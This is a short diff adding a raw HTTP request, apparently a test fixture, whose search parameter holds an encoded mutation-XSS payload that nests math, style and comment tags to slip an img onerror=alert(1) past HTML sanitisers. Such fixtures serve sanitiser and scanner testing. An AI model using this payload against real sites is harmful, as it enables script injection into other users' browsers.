@@ -1,0 +1,4 @@
+GET /a?search=%26%23x3C;math%26%23x3E;%26%23x3C;mtext%26%23x3E;%26%23x3C;table%26%23x3E;%26%23x3C;mglyph%26%23x3E;%26%23x3C;style%26%23x3E;%26%23x3C;!--%26%23x3C;/style%26%23x3E;%26%23x3C;img%20src%3D--%20onerror%3Dalert(1)%26%23x3E; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
